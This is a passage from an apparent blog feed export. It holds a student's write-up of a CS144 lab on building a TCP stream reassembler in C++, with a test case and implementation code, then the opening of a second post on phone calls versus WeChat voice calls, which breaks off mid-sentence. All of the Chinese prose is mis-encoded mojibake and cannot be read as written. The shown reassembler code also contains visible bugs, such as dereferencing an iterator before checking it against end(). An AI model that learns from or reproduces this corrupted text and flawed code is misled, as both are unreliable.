ä¹Ÿå¾ˆå¤šï¼‰ï¼Œæš´åŠ›æ¨¡æ‹Ÿäº† 200 å¤šè¡Œ ğŸ˜­ï¼ŒåŒ…å«äº†æ•´æ•´ 5 å±‚æ¡ä»¶åˆ¤æ–­ ğŸ˜­ã€‚ç”±äºå¤ªå¤šç§æƒ…å†µéœ€è¦åˆ†æäº†ï¼Œéš¾å…ä¼šæœ‰ç–æ¼ï¼Œæœ€åæˆ‘å®åœ¨ä¸æƒ³ä¿®è¡¥äº†ï¼Œäºæ˜¯ä¾¿æ”¾å¼ƒäº†<code>map</code>ã€‚åé¢æˆ‘ä¸€æƒ³ï¼Œç›´æ¥æ¯ä¸€ä¸ªåºå·å¯¹åº”ä¸€ä¸ªå­—èŠ‚ä¸ä¹…ç®€å•å¾ˆå¤šäº†å—ï¼ï¼</p><p>çœ‹åˆ°å…¶ä»–äººä¸‰å››åè¡Œå°±è§£å†³äº†ï¼Œè€Œæˆ‘ä¸¤ç™¾è¡Œå†™äº†ä¸€æ•´å¤©ï¼Œæ„Ÿè§‰è‡ªå·±çœŸçš„å¾ˆèœã€‚å½“ç„¶ä¼˜åŒ–æ˜¯åè¯äº†ï¼Œè‡³å°‘å…ˆæŠŠå®éªŒå®Œæˆäº†ï¼Œå†å»è€ƒè™‘å‡å°‘é‡å¤ä»£ç ï¼ˆå‡½æ•°å°è£…ï¼‰ï¼Œæé«˜æ€§èƒ½ï¼ˆé€‰æ‹©å…¶ä»–æ•°æ•°æ®ç»“æ„ï¼‰ç­‰é—®é¢˜ã€‚</p><h2 id="æµç¨‹æ¨¡æ‹Ÿ"><a class="markdownIt-Anchor" href="#æµç¨‹æ¨¡æ‹Ÿ"></a> æµç¨‹æ¨¡æ‹Ÿ</h2><ul><li>è¾“å…¥çš„å­å­—ç¬¦ä¸²å¯ä»¥ç”±ä¸‰ä¸ªé‡å”¯ä¸€æè¿°ï¼š<strong>å­—ç¬¦ä¸²å€¼ã€é•¿åº¦ã€ç¬¬ä¸€ä¸ªå­—èŠ‚çš„åºå·</strong>ã€‚æˆ‘ä»¬åœ¨<code>push_substring</code>ä¸­å¯ä»¥çœ‹åˆ°è¾“å…¥ä¸­è¿˜æœ‰ä¸€ä¸ªé‡<code>eof</code>ï¼Œè¿™ä»£è¡¨çš„æ˜¯<code>substring</code>æµæ˜¯å¦åˆ°è¾¾æœ«å°¾ï¼Œæ‰€ä»¥æˆ‘å¹¶æ²¡æœ‰æŠŠå®ƒç®—ä½œå­å­—ç¬¦ä¸²çš„å±æ€§ä¹‹ä¸€ã€‚</li><li>æˆ‘ä»¬è¢«é™åˆ¶ä½¿ç”¨<code>capacity</code>å¤§å°çš„å†…å­˜ï¼Œè¿™ä¸ªå†…å­˜æ˜¯ç”±<code>ByteStream</code>ä¸­çš„ç¼“å†²åŒºï¼ˆä¸‹å›¾ç»¿è‰²éƒ¨åˆ†ï¼‰å’Œ<code>SreamReassembler</code>è‡ªèº«çš„ç¼“å†²åŒºï¼ˆä¸‹å›¾çº¢è‰²éƒ¨åˆ†ï¼‰æ‰€<strong>å…±æœ‰çš„</strong>ã€‚å‰è€…ç”¨äºç¼“å†²å·²ç»é‡ç»„å¥½ä½†å¹¶æœªè¢«åº”ç”¨ç¨‹åºè¯»å–çš„æœ‰åºå¯é å­—ç¬¦ä¸²ï¼Œåè€…ç”¨äºç¼“å­˜æ¥æ”¶åˆ°çš„ä¹±åºå­å­—ç¬¦ä¸²ã€‚<img src="/2024/08/11/CS144-Lab1/capacity.png" alt="capacity.png"></li><li><strong>æ³¨æ„ï¼š</strong> æ¥å—åˆ°çš„å­å­—ç¬¦ä¸²å¯èƒ½æ˜¯ä¹±åºã€é‡å¤çš„ï¼Œå°±å¦‚åŒå®é™…ç½‘ç»œä¸­ä¸€æ ·ã€‚è¿™é‡Œçš„æœ‰ä¸€äº›æ³¨æ„ç‚¹æ˜¯å®éªŒæ–‡æ¡£é‡Œæ²¡è¯´æ¸…æ¥šçš„ï¼ˆä¸è¶³ä¹‹å¤„ï¼‰ï¼Œæˆ‘é€šè¿‡è°ƒè¯•æµ‹è¯•ç”¨ä¾‹æ‰å‘ç°çš„ï¼ˆé¢å‘æµ‹è¯•ç”¨ä¾‹ç¼–ç¨‹ ğŸ˜µï¼‰ã€‚<ul><li>å­å­—ç¬¦ä¸²å¯èƒ½å®Œå…¨ä½äºè“è‰²/ç»¿è‰²ï¼ˆå·²è¯»å‡º/å·²å†™å…¥<code>ByteStream</code>ï¼‰éƒ¨åˆ†ï¼Œéœ€è¦ç›´æ¥ä¸¢æ‰</li><li>å­å­—ç¬¦ä¸²å¯èƒ½æœ‰ä¸€éƒ¨åˆ†æ˜¯å·²ç»å†™å…¥<code>ByteStream</code>ï¼ˆç»¿è‰²ï¼‰ï¼Œè€Œæœ‰ä¸€éƒ¨åˆ†æ˜¯æœªå†™å…¥çš„ï¼ˆçº¢è‰²ï¼‰ï¼Œéœ€è¦è¿›è¡Œè£å‰ª</li><li>å­å­—ç¬¦ä¸²å¯èƒ½å…¨æ˜¯çº¢è‰²éƒ¨åˆ†ï¼Œå®éªŒè¦æ±‚æˆ‘ä»¬åœ¨çº¢è‰²éƒ¨åˆ†ä¸èƒ½æœ‰é‡å çš„å­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯è¯´è¯»å…¥çš„æ—¶å€™æˆ‘ä»¬è¦å¯¹å®ƒè¿›è¡Œåˆå¹¶æ‰èƒ½ç¼“å­˜åˆ°<code>Reassembler</code>ä¸­</li><li>å­—ç¬¦ä¸²å¯èƒ½æ˜¯åŒ…å«<code>EOF</code>ä¿¡æ¯çš„ç©ºå­—ç¬¦ä¸²ï¼Œå…³é”®åœ¨<code>EOF</code>çš„å¤„ç†</li></ul></li></ul><h2 id="è°ƒè¯•"><a class="markdownIt-Anchor" href="#è°ƒè¯•"></a> è°ƒè¯•</h2><h3 id="std-mapsize_t-std-stringç‰ˆ"><a class="markdownIt-Anchor" href="#std-mapsize_t-std-stringç‰ˆ"></a> std: :map&lt;size_t, std: :string&gt;ç‰ˆ</h3><p>æ ¹æ®ä»¥ä¸Šçš„æ€è·¯ï¼Œæˆ‘å°è¯•ç”¨ä¸€ä¸ªæµ‹è¯•ç”¨ä¾‹çœ‹çœ‹å…·ä½“çš„è¿‡ç¨‹ï¼Œä¸‹é¢æ˜¯<code>fsm_stream_reassembler_single.cc</code>ä¸­çš„ä¸€ä¸ªä¾‹å­ã€‚</p><blockquote><p>åˆå§‹åŒ–<code>capacity</code>å¤§å°ä¸º 8ï¼Œç„¶åè¾“å…¥åºå·ä¸º 0 çš„&quot;abc&quot;å­å­—ç¬¦ä¸²ï¼Œç›´æ¥ç¼“å­˜åˆ°<code>ByteStream</code>ä¸­ï¼Œä¸‹ä¸€ä¸ªæœŸå¾…æ¥å—åˆ°çš„åºå·åº”è¯¥æ˜¯ 3ã€‚ä¹‹åå†è¾“å…¥åºå·ä¸º 6 çš„&quot;ghX&quot;å­—ç¬¦ä¸²ï¼Œä¸”æœ€åä¸€ä¸ªå­—èŠ‚æ˜¯å­—ç¬¦ä¸²æµçš„æœ«å°¾ï¼Œç”±äºå‰é¢è¿˜æœ‰å­—èŠ‚æœªæ¥æ”¶åˆ°ï¼Œå› æ­¤å…ˆç¼“å­˜åˆ°<code>Reassembler</code>çš„ç¼“å†²åŒºä¸­ã€‚ä¹‹ååˆè¾“å…¥äº†åºå·ä¸º 2 çš„å­—ç¬¦ä¸²&quot;cdefg&quot;ï¼Œç”±äºåºå· 2 çš„å­—èŠ‚å·²ç»å†™å…¥<code>ByteSream</code>äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼šå¯¹å­—ç¬¦ä¸²è¿›è¡Œè£å‰ªï¼Œç›¸å½“äºè¾“å…¥çš„æ˜¯åºå·ä¸º 3 çš„å­—ç¬¦ä¸²&quot;defg&quot;ã€‚æ³¨æ„åˆ°æ­¤æ—¶ç¼“å†²åŒºä¸­æœ‰å·²é‡ç»„çš„å­—ç¬¦ä¸²&quot;abc&quot;+æœªé‡ç»„çš„å­—ç¬¦ä¸²&quot;ghX&quot;ï¼Œå‰©ä½™å†…å­˜å¤§å°ä¸º 2ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªèƒ½ç¼“å­˜åºå·ä¸º 3 çš„&quot;de&quot;å­—ç¬¦ä¸²ï¼Œæ°å¥½æ˜¯æœŸæœ›çš„ä¸‹ä¸€ä¸ªå­—èŠ‚åºå·ï¼Œç«‹å³å†™å…¥åˆ°<code>ByteStream</code>ä¸­ã€‚æ­¤æ—¶<code>ByteStream</code>ç¼“å†²åŒºåº”è¯¥æœ‰å­—ç¬¦ä¸²&quot;abcde&quot;ï¼Œè€Œ<code>Reassembler</code>ç¼“å­˜åŒºä¸­åº”è¯¥æœ‰åºå·ä¸º 6 çš„å­å­—ç¬¦&quot;ghX&quot;ï¼Œç»“æœä¸æµ‹è¯•ç”¨ä¾‹ä¸ç¬¦åˆï¼</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">ReassemblerTestHarness test&#123;<span class="number">8</span>&#125;;</span><br><span class="line">Â  Â  Â  Â  Â  Â </span><br><span class="line">Â  Â  test.<span class="built_in">execute</span>(SubmitSegment&#123;<span class="string">&quot;abc&quot;</span>, <span class="number">0</span>&#125;);</span><br><span class="line">Â  Â  test.<span class="built_in">execute</span>(<span class="built_in">BytesAssembled</span>(<span class="number">3</span>));</span><br><span class="line">Â  Â  test.<span class="built_in">execute</span>(NotAtEof&#123;&#125;);</span><br><span class="line"></span><br><span class="line">Â  Â  test.<span class="built_in">execute</span>(SubmitSegment&#123;<span class="string">&quot;ghX&quot;</span>, <span class="number">6</span>&#125;.<span class="built_in">with_eof</span>(<span class="literal">true</span>));</span><br><span class="line">Â  Â  test.<span class="built_in">execute</span>(<span class="built_in">BytesAssembled</span>(<span class="number">3</span>));</span><br><span class="line">Â  Â  test.<span class="built_in">execute</span>(NotAtEof&#123;&#125;);</span><br><span class="line">Â  Â  Â  Â  Â  Â </span><br><span class="line">Â  Â  test.<span class="built_in">execute</span>(SubmitSegment&#123;<span class="string">&quot;cdefg&quot;</span>, <span class="number">2</span>&#125;);</span><br><span class="line">Â  Â  test.<span class="built_in">execute</span>(<span class="built_in">BytesAssembled</span>(<span class="number">8</span>));</span><br><span class="line">Â  Â  test.<span class="built_in">execute</span>(BytesAvailable&#123;<span class="string">&quot;abcdefgh&quot;</span>&#125;);</span><br><span class="line">Â  Â  test.<span class="built_in">execute</span>(NotAtEof&#123;&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»æµ‹è¯•ç”¨ä¾‹æ¥çœ‹ï¼Œæ˜¯å…ˆåˆå¹¶äº†&quot;defg&quot;å’Œ&quot;ghX&quot;ï¼Œæ­¤æ—¶ç¼“å­˜åŒºæœ‰åºå·ä¸º 3 çš„å­—ç¬¦ä¸²&quot;defghX&quot;ï¼Œè€Œåœ¨å†™å…¥<code>ByteStream</code>æ—¶ç”±äºå†…å­˜é™åˆ¶ä¸¢å¼ƒäº†æœ€åä¸€ä¸ªå­—èŠ‚ï¼æ–‡æ¡£ä¸­å†™é“ &quot;Receive a substring and write any newly contiguous bytes into the stream. The StreamReassembler will stay within the memory limits of the <code>capacity</code>. Bytes that would exceed the capacity are silently discarded.&quot;æ˜¯è¯´è¶…è¿‡ capacity å¤§å°çš„å­—èŠ‚ä¼šä¸¢å¼ƒï¼Œæ‰€ä»¥æˆ‘è®¤ä¸ºåº”è¯¥æ˜¯åœ¨è¾“å…¥å­—ç¬¦ä¸²æ—¶å°±æŠŠå®ƒä¸¢å¼ƒçš„ï¼ˆé”™è¯¯ï¼‰ã€‚</p><p>å…¶å®è¿™ç§æƒ³æ³•å’Œå…·ä½“å®è·µä¸­çš„ç½‘ç»œåŒ…æ”¶å‘æ˜¯ç›¸è¿èƒŒçš„ã€‚åœ¨å¤„ç†ç½‘ç»œåŒ…å¤±åºæ—¶ï¼Œå¦‚æœç¼“å†²åŒºç©ºé—´æœ‰é™å¹¶ä¸”å¿…é¡»ä¸¢å¼ƒæŸäº›æ•°æ®åŒ…ï¼Œéœ€è¦è€ƒè™‘çš„ä¸»è¦åŸåˆ™æ˜¯<strong>å°½é‡ä¿æŒæ•°æ®çš„æœ‰åºæ€§å¹¶å‡å°‘é‡å¤çš„ä¼ è¾“è¯·æ±‚</strong>ï¼Œæ‰€ä»¥ä¼šä¼˜å…ˆä¸¢å¼ƒåºå·è¾ƒå¤§çš„å·²ç¼“å­˜çš„æ•°æ®ï¼Œè¿™ç§ç­–ç•¥çš„ä¸»è¦æ€æƒ³æ˜¯<strong>ä¿æŒæ•°æ®æµçš„è¿ç»­æ€§</strong>ï¼Œä¼˜å…ˆç¡®ä¿æœŸæœ›çš„ä¸‹ä¸€ä¸ªåºå·çš„æ•°æ®åŒ…èƒ½å¤Ÿå°½å¿«è¢«æ¥æ”¶åˆ°ã€‚<br><img src="/2024/08/11/CS144-Lab1/%E9%9D%A2%E5%90%91%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B.png" alt="é¢å‘æµ‹è¯•ç”¨ä¾‹.png"><br>åœ¨åç»­è°ƒè¯•è¿‡ç¨‹æˆ‘å‘ç°æˆ‘è¿˜æœ‰ä¸€äº›æƒ…å†µæ²¡æœ‰è€ƒè™‘åˆ°ï¼Œè€Œè¿™ç§æ˜ å°„å…³ç³»æ¨¡æ‹Ÿèµ·æ¥è¿‡äºç¹çï¼Œå› æ­¤æ”¾å¼ƒäº†æ˜ å°„åˆ°<code>std::string</code>ï¼Œå°è¯•æ˜ å°„åˆ°<code>std::char</code>é‡æ–°å†™ä¸€éã€‚</p><h3 id="std-mapsize_t-charç‰ˆ"><a class="markdownIt-Anchor" href="#std-mapsize_t-charç‰ˆ"></a> std: :map&lt;size_t, char&gt;ç‰ˆ</h3><h4 id="å®ç°è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#å®ç°è¿‡ç¨‹"></a> å®ç°è¿‡ç¨‹</h4><ol><li>å…ˆå¯¹æ¥æ”¶çš„å­å­—ç¬¦ä¸²è¿›è¡Œè£å‰ªï¼Œç„¶åç¼“å­˜åˆ°<code>StreamReassembler</code>ä¸­</li><li>åœ¨<code>capaity</code>ç¼“å†²åŒºå¤§å°çš„é™åˆ¶ä¸‹ï¼Œé‡‡å–ä¼˜å…ˆä¸¢å¼ƒåºå·è¾ƒå¤§çš„å·²ç¼“å­˜å­—ç¬¦ä¸²çš„ç­–ç•¥ï¼Œå¯¹<code>StreamReassembler</code>ç¼“å†²åŒºè¿›è¡Œé™åˆ¶</li><li>åˆ¤æ–­æ˜¯å¦å°†<code>StreamReassembler</code>ä¸­çš„é‡ç»„å­—ç¬¦ä¸²å†™å…¥<code>ByteSream</code>ä¸­</li></ol><h4 id="æµ‹è¯•ç»“æœ"><a class="markdownIt-Anchor" href="#æµ‹è¯•ç»“æœ"></a> æµ‹è¯•ç»“æœ</h4><p><img src="/2024/08/11/CS144-Lab1/%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%9C.png" alt="æµ‹è¯•ç»“æœ.png"><br>æµ‹è¯•ç”¨ä¾‹<code>t_strm_reassem_many</code>å’Œ<code>t_strm_reassem_win</code>ç”¨æ—¶è¿‡é•¿</p><h2 id="å®ç°ä»£ç "><a class="markdownIt-Anchor" href="#å®ç°ä»£ç "></a> å®ç°ä»£ç </h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* stream_reassembler.hh */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StreamReassembler</span> &#123;</span><br><span class="line"></span><br><span class="line">Â  <span class="keyword">private</span>:</span><br><span class="line">Â  Â  <span class="comment">// Your code here -- add private members as necessary.</span></span><br><span class="line">Â  Â  std::map&lt;<span class="type">size_t</span>, <span class="type">char</span>&gt; buffer; Â <span class="comment">// ç”¨äºæ”¾ç½®æœªé‡ç»„çš„å­å­—ç¬¦ä¸²</span></span><br><span class="line">Â  Â  <span class="type">size_t</span> sequence_num = <span class="number">0</span>; Â  Â  Â  Â <span class="comment">// æ ‡è®°åº”è¯¥æ¥æ”¶åˆ°çš„ä¸‹ä¸€ä¸ªåºåˆ—å·</span></span><br><span class="line">Â  Â  <span class="type">size_t</span> buffer_size = <span class="number">0</span>; Â  Â  Â  Â  <span class="comment">// è¡¨ç¤ºbufferä¸­ç¼“å­˜çš„æ‰€æœ‰å­å­—ç¬¦ä¸²çš„æ€»å­—èŠ‚æ•°ï¼ˆæ— é‡å¤ï¼‰</span></span><br><span class="line">Â  Â  <span class="type">size_t</span> ended_seq Â = std::numeric_limits&lt;<span class="type">size_t</span>&gt;::<span class="built_in">max</span>() - <span class="number">2</span>; Â  Â <span class="comment">// æµçš„æœ€åä¸€ä¸ªå­—èŠ‚çš„åºå·</span></span><br><span class="line">Â  Â  <span class="type">bool</span> _eof = <span class="literal">false</span>; Â  <span class="comment">// æµæ˜¯å¦åˆ°è¾¾ç»“å°¾</span></span><br><span class="line">Â  Â  ByteStream _output; Â <span class="comment">//!&lt; The reassembled in-order byte stream</span></span><br><span class="line">Â  Â  <span class="type">size_t</span> _capacity; Â  Â <span class="comment">//!&lt; The maximum number of bytesÂ </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*stream_reassembler.cc*/</span></span><br><span class="line">StreamReassembler::<span class="built_in">StreamReassembler</span>(<span class="type">const</span> <span class="type">size_t</span> capacity) : <span class="built_in">buffer</span>(), _output(capacity), _capacity(capacity)&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StreamReassembler::push_substring</span><span class="params">(<span class="type">const</span> string &amp;data, <span class="type">const</span> <span class="type">size_t</span> index, <span class="type">const</span> <span class="type">bool</span> eof)</span> </span>&#123;</span><br><span class="line">Â  Â  <span class="type">size_t</span> last_seq = index + data.<span class="built_in">length</span>(); Â  Â <span class="comment">// è¯¥å­å­—ç¬¦ä¸²æœ€åä¸€ä¸ªå­—èŠ‚çš„ä¸‹ä¸€ä¸ªåºåˆ—å·</span></span><br><span class="line">Â  Â  <span class="keyword">if</span>(eof)&#123;</span><br><span class="line">Â  Â  Â  Â  <span class="comment">// å­å­—ç¬¦ä¸²å¤„äºæµçš„æœ«å°¾</span></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span>(data != <span class="string">&quot; &quot;</span>)&#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  ended_seq = last_seq - <span class="number">1</span>;</span><br><span class="line">Â  Â  Â  Â  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  ended_seq = <span class="number">0</span>;</span><br><span class="line">Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â  <span class="keyword">if</span>(!eof &amp;&amp; data == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">return</span> ;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â  <span class="keyword">if</span>(last_seq &lt;= sequence_num &amp;&amp; data != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">Â  Â  Â  Â  <span class="comment">// å­å­—ç¬¦ä¸²å·²ç»é‡ç»„</span></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">return</span> ;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">if</span>(index &lt; sequence_num)&#123;</span><br><span class="line">Â  Â  Â  Â  <span class="comment">// è¿›è¡Œå­—ç¬¦ä¸²è£å‰ª</span></span><br><span class="line">Â  Â  Â  Â  <span class="built_in">push_substring</span>(data.<span class="built_in">substr</span>(sequence_num - index), sequence_num, eof);</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">return</span> ;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â  <span class="keyword">for</span>(<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; data.<span class="built_in">length</span>(); ++i)&#123;</span><br><span class="line">Â  Â  Â  Â  <span class="comment">// å°†å­å­—ç¬¦ä¸²å…ˆç¼“å­˜åˆ°bufferä¸­</span></span><br><span class="line">Â  Â  Â  Â  buffer.<span class="built_in">insert</span>(<span class="built_in">make_pair</span>(index + i, data[i]));</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â  buffer_size = <span class="number">0</span>;</span><br><span class="line">Â  Â  <span class="keyword">for</span>(<span class="keyword">auto</span> iter = buffer.<span class="built_in">begin</span>(); iter != buffer.<span class="built_in">end</span>(); iter++)&#123;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span>(buffer_size &gt;= _capacity - _output.<span class="built_in">buffer_size</span>())&#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  buffer.<span class="built_in">erase</span>(iter, buffer.<span class="built_in">end</span>());</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">break</span>;</span><br><span class="line">Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  Â  Â  buffer_size++;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">for</span>(<span class="keyword">auto</span> iter = buffer.<span class="built_in">begin</span>(); iter-&gt;first == sequence_num &amp;&amp; iter != buffer.<span class="built_in">end</span>();)&#123;</span><br><span class="line">Â  Â  Â  Â  <span class="comment">// åˆ¤æ–­æ˜¯å¦å¯ä»¥å†™å…¥é‡ç»„å­—ç¬¦ä¸²</span></span><br><span class="line">Â  Â  Â  Â  _output.<span class="built_in">write</span>(<span class="built_in">string</span>(<span class="number">1</span>, iter-&gt;second));</span><br><span class="line">Â  Â  Â  Â  buffer_size--; Â  Â  Â <span class="comment">// æ›´æ–°bufferå¤§å°</span></span><br><span class="line">Â  Â  Â  Â  sequence_num++; Â  Â  <span class="comment">// æ›´æ–°æœŸæœ›çš„ä¸‹ä¸€ä¸ªåºåˆ—å·</span></span><br><span class="line">Â  Â  Â  Â  iter = buffer.<span class="built_in">erase</span>(iter); <span class="comment">// é‡Šæ”¾å·²è¯»å…¥çš„å­—ç¬¦ä¸²å†…å­˜</span></span><br><span class="line">Â  Â  &#125;</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">if</span>((sequence_num<span class="number">-1</span>) == ended_seq)&#123;</span><br><span class="line">Â  Â  Â  Â  _eof = <span class="literal">true</span>;</span><br><span class="line">Â  Â  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(eof &amp;&amp; data == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">Â  Â  Â  Â  _eof = eof;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">if</span>(_eof &amp;&amp; buffer.<span class="built_in">empty</span>())&#123;</span><br><span class="line">Â  Â  Â  Â  _output.<span class="built_in">end_input</span>();</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">StreamReassembler::unassembled_bytes</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> buffer_size; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">StreamReassembler::empty</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">if</span>(buffer_size == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>; <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br></pre></td></tr></table></figure><h1 id="æ€»ç»“åæ€"><a class="markdownIt-Anchor" href="#æ€»ç»“åæ€"></a> æ€»ç»“åæ€</h1><ol><li>å¯¹ C++çš„ STL ä¸ç†Ÿæ‚‰ï¼Œå› æ­¤åœ¨ç¼“å†²åŒºçš„æ¨¡æ‹Ÿä¸­èµ°äº†å¼¯è·¯</li><li>å¯¹äºåŸºæœ¬ç®—æ³•ä¸ç†Ÿç»ƒï¼Œéœ€è¦å¤šåˆ·é¢˜æå‡æ€ç»´</li><li>ä¿æŒåˆå¿ƒï¼Œä½†ä¸è¦é’»ç‰›è§’å°–ï¼Œå­¦ä¼šçŸ¥éš¾è€Œé€€ï¼Œå­¦ä¹ ä»–äººçš„ä»£ç æ˜¯å¦‚ä½•è®¾è®¡æ„å»ºçš„ï¼Œä¹Ÿæ˜¯å­¦ä¹ çš„ä¸€ä¸ªæ–¹æ³•</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;lab-1-é¡¹ç›®æ„å»º&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#lab-1-é¡¹ç›®æ„å»º&quot;&gt;&lt;/a&gt; Lab 1 é¡¹ç›®æ„å»º&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;/2024/08/11/CS144-Lab1/startcode.png&quot; </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>æ‰‹æœºç”µè¯å’Œå¾®ä¿¡è¯­éŸ³â€”â€”ä»ä¸¤ç§å³æ—¶é€šä¿¡æŠ€æœ¯çš„åŒºåˆ«çœ‹é€šä¿¡ç½‘ç»œçš„å‘å±•</title>
    <link href="http://example.com/2024/08/08/%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%8F%91%E5%B1%95/"/>
    <id>http://example.com/2024/08/08/%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%8F%91%E5%B1%95/</id>
    <published>2024-08-08T07:58:41.419Z</published>
    <updated>2024-08-09T08:06:51.770Z</updated>
    
    <content type="html"><![CDATA[<h2 id="é—®é¢˜äº§ç”Ÿ"><a class="markdownIt-Anchor" href="#é—®é¢˜äº§ç”Ÿ"></a> é—®é¢˜äº§ç”Ÿ</h2><p>åœ¨ä¸€æ¬¡å¸®å®¶é‡Œè€äººåŠç†è¿è¥å•†å¥—é¤æ—¶ï¼Œæˆ‘å»ºè®®é•¿è¾ˆè¦æ‰“ç”µè¯çš„è¯å°±å°½é‡ç”¨å¾®ä¿¡æ¥æ‰“ç”µè¯ï¼Œè€Œå°‘ç”¨æ‹¨å·çš„æ–¹å¼æ‹¨æ‰“ç§»åŠ¨ç”µè¯ã€‚å¯¹æ­¤æˆ‘å’Œé•¿è¾ˆçš„è§£é‡Šæ˜¯ï¼šå‰è€…ç”¨çš„æ˜¯â€œæµé‡â€ï¼Œåè€…ç”¨çš„æ˜¯â€œè¯è´¹â€ï¼Œåªè¦åœ¨æœ‰ WiFi çš„ç¯å¢ƒä¸‹æ‰“å¾®ä¿¡ç”µè¯å°±èƒ½ä¸èŠ±è¯è´¹äº†ã€‚ä½†å¯¹äºä¸¤è€…é€šè¯æŠ€æœ¯çš„åŒºåˆ«ï¼Œæˆ‘å´å‘ç°è‡ªå·±ä¹Ÿæ˜¯å®Œå…¨ä¸äº†è§£ï¼Œæ›´åˆ«è¯´å’Œå…¶ä»–äººè§£é‡Šâ€œæ‰‹æœºç”µè¯â€å’Œâ€œå¾®ä¿¡ç”µè¯â€ä¸ºä»€ä¹ˆä¸€ä¸ªç”¨çš„æ˜¯è¯è´¹è€Œå¦ä¸€ä¸ªç”¨çš„æ˜¯æµé‡äº†ã€‚</p><p>æ°å¥½æœ€è¿‘åœ¨è¯»ã€Šè‡ªé¡¶å‘ä¸‹ã€‹çš„æ— çº¿ç½‘ç»œå’Œç§»åŠ¨ç½‘ç»œä¸€ç« 